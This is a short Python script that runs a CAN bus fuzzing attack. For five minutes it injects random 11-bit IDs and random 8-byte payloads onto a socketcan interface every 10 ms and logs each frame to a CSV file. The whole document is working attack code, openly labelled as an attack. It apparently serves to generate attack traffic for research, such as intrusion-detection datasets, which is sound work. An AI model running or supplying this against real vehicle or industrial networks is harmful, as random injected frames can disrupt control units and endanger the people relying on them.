import can
import random
import time
import csv

# Initialize CAN interface
bus = can.interface.Bus(channel='can0', bustype='socketcan', bitrate=500000)

# Define the attack duration
attack_duration = 300  # Duration of the attack in seconds

# File to log the attack messages
attack_log_file = 'fuzzing_attack_log.csv'

def fuzzy_attack():
    attack_start_time = time.time()
    attack_end_time = attack_start_time + attack_duration

    with open(attack_log_file, 'w', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(['Timestamp', 'ID', 'Data'])

        while time.time() <= attack_end_time:
            # Generate random CAN ID and data
            can_id = random.randint(0x000, 0x7FF)
            data = [random.randint(0x00, 0xFF) for _ in range(8)]
            
            # Create CAN message
            msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
            
            # Send CAN message
            bus.send(msg)

            # Loging
            timestamp = time.time()
            csv_writer.writerow([timestamp, hex(msg.arbitration_id), ''.join(format(x, '02x') for x in msg.data)])

            time.sleep(0.01)

if __name__ == "__main__":
    fuzzy_attack()
